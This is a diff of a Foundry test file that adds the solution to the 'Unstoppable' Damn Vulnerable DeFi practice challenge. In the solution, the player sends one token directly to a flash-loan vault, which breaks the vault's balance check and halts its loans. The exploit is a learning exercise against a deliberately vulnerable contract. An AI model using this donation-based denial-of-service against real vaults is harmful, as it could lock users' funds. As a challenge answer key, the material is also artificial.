@@ -5,6 +5,13 @@ import {Test, console2} from "forge-std/Test.sol";
 import {ReceiverUnstoppable} from "../../src/Week8-9/U_ReceiverUnstoppable.sol";
 import {UnstoppableVault, DamnValuableToken} from "../../src/Week8-9/U_UnstoppableVault.sol";
 
+/**
+ * There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free,
+ * until the grace period ends.
+ * To pass the challenge, make the vault stop offering flash loans.
+ * You start with 10 DVT tokens in balance.
+ */
+
 //forge test --match-contract UnstoppableTest -vvvv
 contract UnstoppableTest is Test {
     uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
@@ -53,15 +60,10 @@ contract UnstoppableTest is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(player);
+        token.transfer(address(vault), 1e18);
         vm.expectRevert();
         validation();
-        console2.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
